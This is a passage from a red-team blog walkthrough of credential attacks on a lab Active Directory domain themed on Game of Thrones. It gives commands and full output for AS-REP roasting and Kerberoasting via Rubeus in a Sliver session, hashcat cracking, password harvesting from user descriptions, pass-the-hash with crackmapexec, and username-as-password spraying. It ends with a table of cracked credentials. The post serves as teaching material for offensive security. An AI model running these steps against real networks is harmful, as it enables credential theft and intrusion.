<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 18200 --force -a 0 /tmp/arep.txt Documents/rockyou.txt</span><br><span class="line"></span><br><span class="line">$krb5asrep$23<span class="variable">$brandon</span>.stark@north.sevenkingdoms.local:630e0bfba9a62edeb4f119823a037e3c<span class="variable">$dfb26233f0ef839793b7a2c8c6eb173a05218da54e8cfddfa7a726ab7831b113fc3257a71fe5e931d12ba020a68de9cd83c28d2cd73bdd2c8a7473604d084984a2a0b177b35d1aeafaa70874d4d6f55a9bbb80b1074894336907ef3fc7c8fcfc3f8b84511fafe0229c076ada8d97c83bb31051022598de1eeee10ea261e423da80009d7ad041606f5fd9c384f974f608f41a266b4402efd15923614cf855740fd98ac7da75c27573de2413a4297446b6550bd4d65f1b6526763cea3e30f325e746a4e2b79d9da5db3955f0b47958ed9d50f3c4477cb6ac02e6c27133660cf3b24a234b0e0a6857cfc8681e0b5667c6c424db55986850a3793b17a53f86bfb4fe88f85c2af22f</span>:iseedeadpeople</span><br></pre></td></tr></table></figure>

<p>User <code>brandon.stark</code> is found with password <code>iseedeadpeople</code>.</p>
<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>Checking if there are any SPNs with weak password.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sliver (REAL_ROBIN) &gt; rubeus  kerberoast /domain:north.sevenkingdoms.local /nowrap</span><br><span class="line"></span><br><span class="line">[*] rubeus output:</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.0.1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES-enabled accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target Domain          : north.sevenkingdoms.local</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://winterfell.north.sevenkingdoms.local/DC=north,DC=sevenkingdoms,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable <span class="built_in">users</span> : 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : jon.snow</span><br><span class="line">[*] DistinguishedName      : CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=<span class="built_in">local</span></span><br><span class="line">[*] ServicePrincipalName   : CIFS/winterfell.north.sevenkingdoms.local</span><br><span class="line">[*] PwdLastSet             : 3/7/2023 9:04:06 PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*jon.snow<span class="variable">$north</span>.sevenkingdoms.local<span class="variable">$CIFS</span>/winterfell.north.sevenkingdoms.local@north.sevenkingdoms.local*$8EF414D681E524F03C47F7435AF5989E<span class="variable">$200C6CDFD190F0244B49032D3ECE955EABD7FBEFF02BE962579675B52EA16964E09B81FF9B1438BC528C54C3B64D26465D0F9B396496FC2F5BA43FEB2F1A86A2BBB5EACC7727A443FD93815B4EF8E52336D3F2C04680F83798C9AB066930253D939DA7CB84A3208AE985E23003F224432C3D57ECEB3434B049B62F83ECB5C1E4CCD73A483B76F5A8BB56486DC21D0818987F9FA769641C943BCA2436A5DE1E840DBE756F736DEFAE6F5957A4133C853954B6D851B0794CB709697BA1865252B298A00C17BEC7538F5E5CA1BA19CF12B23144B190D250BC0340ACB5EB71671DC834025C28615EE67ED46DDDD3198C22563E1423F4B4D42EF0A9090F90B249FF474808027277AA27BD7975A46BA953DF15710B4474310A83299F75AAC4AD308851C1DCCBA55D60F6E640A62F2B7883642DE0F9E0A260C443A505B4EB105016729A281E112917CD61945EB77D0AED0ADCA9DB7676D11A718490E0F85AA8EFB4A2A2C89A4674F574FB0B74D4D7CF2AB0977FEC6F9822883AD1F57B35AAEDC4F06A24C9563F08D0078B36BF86E19C62B3EA5C310491D01FE340E57A0E21AF4D1CCB29CB1FEA209EE6250603162E55DF4744C3527ED256CEA9B2302768CA6045F153BC10AD22C25DF3776CB3F19ED471799F69F4EA799C200838D08313900D0CBD6B1695B1222A6815D7005D5DE2B2293169509B0FD2343F9F04722EA8CE0C96F982AC5925F89604AB41307CE6077D78B8212DE6676A83C706365B33FEB1B000EDA6780BD31453CD71C35002F6D978C3B2CA71FBD34D06B20BC223F56F966467086EA2794D86C4333A79594797E88FAC36C4A7519A18A522B011E72110DD07BC5AB7FF52D29BFBAB36D2C57D763EAE9BE83E978E4B1CAF1F3BD6CF19E3899219E3BB96D6736F3479386734CF822AAB53CEB343C60839633BF72D5AF71F409EF04316364D8CA4A80745541BE4B933B1FE0258C8857B5B62D0C4E589C09D57C02338514E56F9C2CC3E1A7F14B4FBD880FFBD2162EE38F3F8A67FB3B7FD38EEDE132C13C433634B7DF4A9EBAE23C9A48B62FEA9BFF2654740078B5A6BD5A27B90AC5C7CD5549C9DF0C02C3CC6EB91416DC8C2D5B119CCC7E2E240B3D2C0F97EF0CA454EEA8B762FE8D90D5286C26174BDE87793BEF12DFF317A77804128521173209EE1093EA665BF16C9364036AB3EC0017902E816943918F086EC4DCC29E394485A78FB1FFB24521A640032086B9356393E5696A71A63A393DDF00725615E990BDCD59962A7C66C81192F566805544020735000052EFFEB9726A1F30797F2DC28F404E1F696FD9FE3C37C52949ED767C4DB732B78A05534E748DF33E8C3BC51A47A2C28206A90DAC77D5CC7D2410898F9C4C9B7548640D6F43D33C46FDFF6B973A580904C055B53B8635767E161AB1705D635B8A406874DFE17BCCE0489E5DFA6822FD2D8C76DC910717EA84B53ED07940DF5FF38E6F6F3C3BA7AD490E969AEEB0F103C41B12D4789FE557673F12CD4E86A8E5BBB086B5070EBFB1BF62ADBE237EC6C159B24EBADE43354E59C040E61DBB47D714F383B30317807C9186C02450C4B61F773C88C10B43E992F</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : sql_svc</span><br><span class="line">[*] DistinguishedName      : CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=<span class="built_in">local</span></span><br><span class="line">[*] ServicePrincipalName   : MSSQLSvc/castelblack.north.sevenkingdoms.local</span><br><span class="line">[*] PwdLastSet             : 3/7/2023 9:04:11 PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*sql_svc<span class="variable">$north</span>.sevenkingdoms.local<span class="variable">$MSSQLSvc</span>/castelblack.north.sevenkingdoms.local@north.sevenkingdoms.local*$B92A064DA6873DCA0D2AA674BBA524AD<span class="variable">$A55AE732B29B107D96397FB4465895D4831532506B885EE3FE7F5C35D9641412AD1FCB6B33FDBB84675EF393F86F1D65A58DF8FE62316A47C56D65D9A1144637F1A2906C497E6ECE8059CA4FB2EA64A2975BE4D896A9CBE1159914095F0AF0F261ED38F5C4DF4D9AF2D02A3905A8239461E4D2C3DADFE81950EBB04B928435A950FD5B73E995AA6451422374C6C57DBA7699705536C3B9D32EA05360E3706054B995A6AEBA7E783AAC5C281A3E11C533C9929F9163957CC2F5E3576142D254E42566916B7216609FA0F75289070E5C33560CA3FA17E21023F37F5F2C1B0C536D9479FCABC15EC29BB1533C00E64B92E632EF262650C33AF4317C93BB9E047BCF2C9BE66A97CAB4176DF1F180002D4A8B16943C3963EFC6DF8E1E0008345EA2B8D48362E168944B1DAEA266FD9C3620A11E6916663711FEEEC34362850E18F003C82454C6AE6CDFD9EFA857CE2FB08C248B0E57F5F62DB6DBE78637E781501D910C56B6F0EB5C2E16E96CA945B5B2B879F28876183FC3EDE945E63202BF2BBF4D65CE208A50856F104DD2EF10A5B3EF1A15DBAE755BCC0B864D6ACED7BEB5702D30CEA38143D64ECECA14C22805C2A26AAAE290406AC9E85870DE788C388C6D8CEE1268D793462044A921FD26ED1959195B39E4695E547110985BFBD7ECBDC4A28CDE9D168869C262C37E7B4031459E4E37894E84C3C42E8436D6D07D915A1ECD075B73A9F8A309F48149828F0C2317944ED298EC46E2CEB1C976311F7BBF50AA2A24AF24180A580DEDA88A78A0C926675A64AA1CA3990CAC21B1C7B5D870B7BF30102F22E3A6985EA92CC652A77240941E3607E58396DCD0FF802154B735809E3DD30000659C5E5B8A9FD3F43D7CFB2783579310AEEE95A96671F4AE5F52DFDF05F7E92638039F9BF7A03EE4777C005BD6E5F65E1E20E79D704F39688018FA7271B6399E79ED22FD7613D11465338F3A1BA6BAB2FEBE6FF40939CB4DF1A638B3A77DED52EB5A7A0DC934875CC6AE93B19193AADD3D0C824CA8F99AB24EA0B6659FB126724ED817A433994430D428BB874690A90022A30DA7EE5C0A209F2EF9A8E333BE7BB76B1D9199FD293AE9ADF28BB1C95BF5088AE0F1AFC784B3F486B354B2F13AD49B138BE4986612098B3A8BF0DDAAC8D5B829DA1F2392C1817F42879530497C620F63D321630C15E794A8261F49B129B1573904071F97A3FBE46F9303EA5CAB9781039B18AC6F4B316AEC0B6E728EF021C5A89F71EB91BA514456CB5ACF5E7635FB5BE0B725DBA6F2188948A61BF9CC8FA92FA391E2A7D13B481E0521FE80B74341243C3CCAE46F2278A5D354DA1EA3D78024A472D9B3E3AA3E77461BC20E4DB4EC46EB61B6D4078EE6D6529C2E28B478E7F92D6C88D94D9C5C29963DC1754B2E94FC928269209B935D7512E645BB28332AF7974DDF6AC049C6F8EF2F9663C00A1692059A752B538F05D9C14D7532407FBC67985FD03328D94E61C962908234AA9A6838254BD0417126765B412D996D834177884341452A320F531753A83A91F69EFC142F40A62CD14100CA1E8FFB3198500656E2993715A5E51B0BAA4716F2B3EF3C5151</span></span><br></pre></td></tr></table></figure>

<p>We found 2 SPN, we already found <code>sql_svc</code> hash from lsass dump.</p>
<p>let’s crack <code>jon.snow</code> using hashcat.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 13100 --force -a 0 /tmp/krb.txt Documents/rockyou.txt</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*jon.snow<span class="variable">$north</span>.sevenkingdoms.local<span class="variable">$CIFS</span>/winterfell.north.sevenkingdoms.local@north.sevenkingdoms.local*$8ef414d681e524f03c47f7435af5989e<span class="variable">$200c6cdfd190f0244b49032d3ece955eabd7fbeff02be962579675b52ea16964e09b81ff9b1438bc528c54c3b64d26465d0f9b396496fc2f5ba43feb2f1a86a2bbb5eacc7727a443fd93815b4ef8e52336d3f2c04680f83798c9ab066930253d939da7cb84a3208ae985e23003f224432c3d57eceb3434b049b62f83ecb5c1e4ccd73a483b76f5a8bb56486dc21d0818987f9fa769641c943bca2436a5de1e840dbe756f736defae6f5957a4133c853954b6d851b0794cb709697ba1865252b298a00c17bec7538f5e5ca1ba19cf12b23144b190d250bc0340acb5eb71671dc834025c28615ee67ed46dddd3198c22563e1423f4b4d42ef0a9090f90b249ff474808027277aa27bd7975a46ba953df15710b4474310a83299f75aac4ad308851c1dccba55d60f6e640a62f2b7883642de0f9e0a260c443a505b4eb105016729a281e112917cd61945eb77d0aed0adca9db7676d11a718490e0f85aa8efb4a2a2c89a4674f574fb0b74d4d7cf2ab0977fec6f9822883ad1f57b35aaedc4f06a24c9563f08d0078b36bf86e19c62b3ea5c310491d01fe340e57a0e21af4d1ccb29cb1fea209ee6250603162e55df4744c3527ed256cea9b2302768ca6045f153bc10ad22c25df3776cb3f19ed471799f69f4ea799c200838d08313900d0cbd6b1695b1222a6815d7005d5de2b2293169509b0fd2343f9f04722ea8ce0c96f982ac5925f89604ab41307ce6077d78b8212de6676a83c706365b33feb1b000eda6780bd31453cd71c35002f6d978c3b2ca71fbd34d06b20bc223f56f966467086ea2794d86c4333a79594797e88fac36c4a7519a18a522b011e72110dd07bc5ab7ff52d29bfbab36d2c57d763eae9be83e978e4b1caf1f3bd6cf19e3899219e3bb96d6736f3479386734cf822aab53ceb343c60839633bf72d5af71f409ef04316364d8ca4a80745541be4b933b1fe0258c8857b5b62d0c4e589c09d57c02338514e56f9c2cc3e1a7f14b4fbd880ffbd2162ee38f3f8a67fb3b7fd38eede132c13c433634b7df4a9ebae23c9a48b62fea9bff2654740078b5a6bd5a27b90ac5c7cd5549c9df0c02c3cc6eb91416dc8c2d5b119ccc7e2e240b3d2c0f97ef0ca454eea8b762fe8d90d5286c26174bde87793bef12dff317a77804128521173209ee1093ea665bf16c9364036ab3ec0017902e816943918f086ec4dcc29e394485a78fb1ffb24521a640032086b9356393e5696a71a63a393ddf00725615e990bdcd59962a7c66c81192f566805544020735000052effeb9726a1f30797f2dc28f404e1f696fd9fe3c37c52949ed767c4db732b78a05534e748df33e8c3bc51a47a2c28206a90dac77d5cc7d2410898f9c4c9b7548640d6f43d33c46fdff6b973a580904c055b53b8635767e161ab1705d635b8a406874dfe17bcce0489e5dfa6822fd2d8c76dc910717ea84b53ed07940df5ff38e6f6f3c3ba7ad490e969aeeb0f103c41b12d4789fe557673f12cd4e86a8e5bbb086b5070ebfb1bf62adbe237ec6c159b24ebade43354e59c040e61dbb47d714f383b30317807c9186c02450c4b61f773c88c10b43e992f</span>:iknownothing</span><br></pre></td></tr></table></figure>

<p>User <code>jon.snow</code> is done with password <code>iknownothing</code>.</p>
<h2 id="Enumerating-passwords-in-AD-users-comments"><a href="#Enumerating-passwords-in-AD-users-comments" class="headerlink" title="Enumerating passwords in AD users comments."></a>Enumerating passwords in AD users comments.</h2><h3 id="SOCKS-Proxy"><a href="#SOCKS-Proxy" class="headerlink" title="SOCKS Proxy"></a>SOCKS Proxy</h3><p>Let’s start socks proxy on our team server to run our tools from the operator machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sliver (REAL_ROBIN) &gt; socks5 start</span><br><span class="line"></span><br><span class="line">[*] Started SOCKS5 127.0.0.1 1081  </span><br><span class="line">⚠️  In-band SOCKS proxies can be a little unstable depending on protocol</span><br><span class="line"></span><br><span class="line">sliver (REAL_ROBIN) &gt; socks5 </span><br><span class="line"></span><br><span class="line"> ID   Session ID                             Bind Address     Username   Passwords </span><br><span class="line">==== ====================================== ================ ========== ===========</span><br><span class="line">  1   3b25e2f9-d03a-4198-a4f6-6926a5ef488e   127.0.0.1:1081 </span><br></pre></td></tr></table></figure>
<p>Crackmapexec module <code>user-desc</code> can be used to search for passwords in users descriptions.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q  crackmapexec ldap 192.168.24.11 -u <span class="string">&#x27;CASTELBLACK$&#x27;</span> -H 95508055cf7a74e202139b07ec29690d -M user-desc</span><br><span class="line">/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: <span class="string">&quot;is not&quot;</span> with a literal. Did you mean <span class="string">&quot;!=&quot;</span>?</span><br><span class="line">  <span class="keyword">if</span> result[<span class="string">&#x27;type&#x27;</span>] is not <span class="string">&#x27;searchResEntry&#x27;</span>:</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [+] north.sevenkingdoms.local\CASTELBLACK$:95508055cf7a74e202139b07ec29690d </span><br><span class="line">USER-DES...                                         User: krbtgt - Description: Key Distribution Center Service Account</span><br><span class="line">USER-DES...                                         User: samwell.tarly - Description: Samwell Tarly (Password : Heartsbane)</span><br><span class="line">USER-DES...                                         Saved 15 user descriptions to /home/kali/.cme/logs/UserDesc-192.168.24.11-20230305_185424.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>We found user <code>samwell.tarly</code> password <code>Heartsbane</code> in the description.</p>
<h2 id="Username-same-as-password"><a href="#Username-same-as-password" class="headerlink" title="Username same as password"></a>Username same as password</h2><p>Starting a password brutforce to check if any user has its own password as the username.</p>
<h3 id="Getting-user-list"><a href="#Getting-user-list" class="headerlink" title="Getting user list."></a>Getting user list.</h3><p>We can get target user list as in below.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(kali~🔥~kali)-[~]$ proxychains -q  crackmapexec ldap 192.168.24.11 -u <span class="string">&#x27;CASTELBLACK$&#x27;</span> -H 95508055cf7a74e202139b07ec29690d --<span class="built_in">users</span>                           </span><br><span class="line">/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: <span class="string">&quot;is not&quot;</span> with a literal. Did you mean <span class="string">&quot;!=&quot;</span>?</span><br><span class="line">  <span class="keyword">if</span> result[<span class="string">&#x27;type&#x27;</span>] is not <span class="string">&#x27;searchResEntry&#x27;</span>:</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [+] north.sevenkingdoms.local\CASTELBLACK$:95508055cf7a74e202139b07ec29690d </span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [*] Total of records returned 17</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       Administrator                  Built-<span class="keyword">in</span> account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       Guest                          Built-<span class="keyword">in</span> account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       ansible                        </span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       krbtgt                         Key Distribution Center Service Account</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       arya.stark                     Arya Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       eddard.stark                   Eddard Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       catelyn.stark                  Catelyn Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       robb.stark                     Robb Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       sansa.stark                    Sansa Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       brandon.stark                  Brandon Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       rickon.stark                   Rickon Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       hodor                          Brainless Giant</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       jon.snow                       Jon Snow</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       samwell.tarly                  Samwell Tarly (Password : Heartsbane)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       jeor.mormont                   Jeor Mormont</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       sql_svc                        sql service</span><br></pre></td></tr></table></figure>

<p>Execluding compromised accounts and running the bruteforce against the others.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(kali~🔥~kali)-[~]$ proxychains -q  crackmapexec smb 192.168.24.11 -u /tmp/users.txt -p /tmp/users.txt --no-bruteforce --continue-on-success</span><br><span class="line">/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: <span class="string">&quot;is not&quot;</span> with a literal. Did you mean <span class="string">&quot;!=&quot;</span>?</span><br><span class="line">  <span class="keyword">if</span> result[<span class="string">&#x27;type&#x27;</span>] is not <span class="string">&#x27;searchResEntry&#x27;</span>:</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\arya.stark:arya.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\eddard.stark:eddard.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\catelyn.stark:catelyn.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\robb.stark:robb.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\sansa.stark:sansa.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\rickon.stark:rickon.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\jeor.mormont:jeor.mormont STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure>

<p>We were able to retrieve user <code>hodor</code> password.</p>
<h2 id="Compromised-accounts"><a href="#Compromised-accounts" class="headerlink" title="Compromised accounts"></a>Compromised accounts</h2><table>
<thead>
<tr>
<th>User</th>
<th>Password</th>
</tr>
</thead>
<tbody><tr>
<td>sql_svc</td>
<td>84a5092f53390ea48d660be52b93b804</td>
</tr>
<tr>
<td>samwell.tarly</td>
<td>Heartsbane</td>
</tr>
<tr>
<td>brandon.stark</td>
<td>iseedeadpeople</td>
</tr>
<tr>
<td>jon.snow</td>
<td>iknownothing</td>
</tr>
<tr>
<td>hodor</td>
<td>hodor</td>
</tr>
</tbody></table>

	  <div class="article-footer-copyright">

</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
    

    <a href="https://mmnoureldin.github.io/Red-Team/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-03-08 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/">red team<span>4</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/credentials-access/">credentials access<span>1</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="https://mmnoureldin.github.io/Red-Team/tags/Sliver/">Sliver<span>3</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1003-001/">T1003.001<span>2</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/lsass/">lsass<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/sharpkatz/">sharpkatz<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/bruteforce/">bruteforce<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/crackmapexec/">crackmapexec<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/Rubeus/">Rubeus<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/Kerberoasting/">Kerberoasting<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/AS-Reproasting/">AS-Reproasting<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1558-004/">T1558.004<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1110/">T1110<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1552/">T1552<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1558-003/">T1558.003<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 Mostafa Noureldin's Blog
  
       
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="https://mmnoureldin.github.io/Red-Team/js/jquery.imagesloaded.min.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/gallery.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/bootstrap.min.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/main.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/search.js"></script> 




</body>
   </html>
